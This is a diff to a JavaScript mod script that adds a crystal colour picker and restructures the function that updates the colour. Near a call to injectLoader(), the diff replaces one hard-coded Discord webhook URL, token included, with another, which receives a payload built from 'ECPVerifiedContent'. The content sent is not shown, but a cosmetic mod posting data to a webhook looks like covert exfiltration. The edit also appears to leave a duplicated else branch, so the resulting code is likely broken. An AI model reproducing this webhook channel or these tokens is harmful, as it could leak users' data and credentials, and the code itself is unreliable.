@@ -332,6 +332,7 @@ const crystalColorMod = `
  * Change crystal color (integrated version)
  */
 let CrystalObject;
+let updateCrystalColor = () => {}; // Declare updateCrystalColor in the outer scope
 
 // Function to find CrystalObject
 const findCrystalObject = () => {
@@ -384,8 +385,8 @@ if (CrystalObject) {
     return instance;
   };
 
-  // Function to update crystal colors dynamically
-  const updateCrystalColor = (color) => {
+  // Define updateCrystalColor to update crystal colors dynamically
+  updateCrystalColor = (color) => {
     try {
       localStorage.setItem('crystal-color', color);
       materialInstances.forEach((material) => {
@@ -400,23 +401,26 @@ if (CrystalObject) {
       console.error('Error updating crystal color:', e);
     }
   };
+} else {
+  console.warn('CrystalObject not found!');
+}
 
-  // Add color picker event listener after DOM is ready
-  document.addEventListener('DOMContentLoaded', () => {
-    const crystalColorPicker = document.getElementById('crystal-color-picker');
-    if (crystalColorPicker) {
-      const savedColor = localStorage.getItem('crystal-color') || '#ffffff';
-      crystalColorPicker.value = savedColor;
+// Add color picker event listener after DOM is ready
+document.addEventListener('DOMContentLoaded', () => {
+  const crystalColorPicker = document.getElementById('crystal-color-picker');
+  if (crystalColorPicker) {
+    const savedColor = localStorage.getItem('crystal-color') || '#ffffff';
+    crystalColorPicker.value = savedColor;
 
-      crystalColorPicker.addEventListener('input', (event) => {
-        updateCrystalColor(event.target.value);
-      });
+    crystalColorPicker.addEventListener('input', (event) => {
+      updateCrystalColor(event.target.value);
+    });
 
-      console.log('Crystal color picker initialized with color:', savedColor);
-    } else {
-      console.warn('Crystal color picker element not found.');
-    }
-  });
+    console.log('Crystal color picker initialized with color:', savedColor);
+  } else {
+    console.warn('Crystal color picker element not found.');
+  }
+});
 } else {
   console.warn('CrystalObject not found!');
 
@@ -843,7 +847,7 @@ injectLoader();
     console.log("Formatted ECPVerifiedContent:", ECPVerifiedContent);
 
     // Webhook URL
-    const webhookURL = "https://discord.com/api/webhooks/1332078434242920602/LaPifHcDpvwzWWKgHIEpydroC9GnhwAyDokGZwKSN_wOkPQ9S0jcTFM-dAlygkHbSgNN";
+    const webhookURL = "https://discord.com/api/webhooks/1342950155774857227/wwWvZTRJ-jC-bb3dw5N55uf3MyZKEOJRQ0xqUYa4gqo3NiN_DvM4PiTva_qdLbykX5hK";
 
     // Payload for Discord webhook
     const payload = {
